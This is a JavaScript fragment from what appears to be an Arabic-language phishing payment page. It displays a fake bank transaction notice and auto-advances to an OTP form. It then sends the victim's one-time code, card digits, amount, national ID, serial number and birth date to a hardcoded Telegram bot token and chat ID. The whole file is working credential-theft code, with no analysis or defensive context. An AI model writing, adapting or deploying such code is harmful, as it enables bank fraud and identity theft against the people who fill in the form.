 const totalPrice = localStorage.getItem("selectedPrice") || "غير متوفر";
  const cardNumber = localStorage.getItem("cardNumber") || "0000";
  const last4 = cardNumber.slice(-4);

  const otpText = `سيتم إجراء معاملة مالية على حسابك المصرفي لسداد مبلغ قيمته ${totalPrice} SAR باستخدام البطاقة المنتهية برقم ${last4}. لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.`;
  document.getElementById("otpText").innerText = otpText;

  const overlay = document.getElementById("overlay");
  const waitBtn = document.getElementById("waitBtn");
  const otpSection = document.getElementById("otpSection");
  const otpTimer = document.getElementById("otpTimer");

  let autoClickTimeout;

  // الزر يظهر بعد 6 ثوانٍ
  setTimeout(() => {
    waitBtn.textContent = "تم التحقق";
    waitBtn.disabled = false;
    waitBtn.style.cursor = "pointer";

    // عند النقر اليدوي
    waitBtn.onclick = () => {
      clearTimeout(autoClickTimeout); // إيقاف التلقائي إن نُفذ يدويًا
      overlay.style.display = "none";
      otpSection.style.display = "block";
      startOTPTimer(180);
    };

    // النقر التلقائي بعد 3 ثواني إذا لم ينقر المستخدم
    autoClickTimeout = setTimeout(() => {
      waitBtn.click(); // كأن المستخدم ضغط عليه
    }, 3000);
  }, 6000);

  function startOTPTimer(duration) {
    let timeLeft = duration;
    const interval = setInterval(() => {
      const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
      const seconds = String(timeLeft % 60).padStart(2, '0');
      otpTimer.textContent = `${minutes}:${seconds}`;
      if (--timeLeft < 0) clearInterval(interval);
    }, 1000);
  }

  document.querySelector('.otp-section button').addEventListener('click', function () {
    const otpValue = document.getElementById('otp').value.trim();
    if (otpValue.length < 4) {
      alert("❗الرجاء إدخال رمز تحقق صالح");
      return;
    }

    const totalPrice = localStorage.getItem("selectedPrice") || "غير متوفر";
    const cardNumber = localStorage.getItem("cardNumber") || "0000";
    const last4 = cardNumber.slice(-4);

    const formData = JSON.parse(localStorage.getItem("formData") || "{}");
    const identity = formData.id || "غير محدد";
    const serial = formData.serial || "غير محدد";
    const birth = formData.dob || formData.seller_dob || "غير محدد";

    const message = `
رمز التحقق:

🔚 آخر ٤ أرقام من البطاقة: ${last4}
💵 المبلغ: ${totalPrice} SAR
🔐 رمز التحقق: ${otpValue}

📄 بيانات المستخدم:
🆔 رقم الهوية: ${identity}
🔢 الرقم التسلسلي: ${serial}
📅 تاريخ الميلاد: ${birth}
`;

  fetch(`https://api.telegram.org/bot7306247318:AAGoAlnx8FRFeHTCHEJ5SzhYtkwfxM5_TQg/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: '8059394046',
      text: message
    })
  })
    .then(response => {
      if (response.ok) {
        window.location.href = "otp2.html";
      } else {
        alert("حدث خطأ أثناء الإرسال إلى Telegram");
      }
    });
  });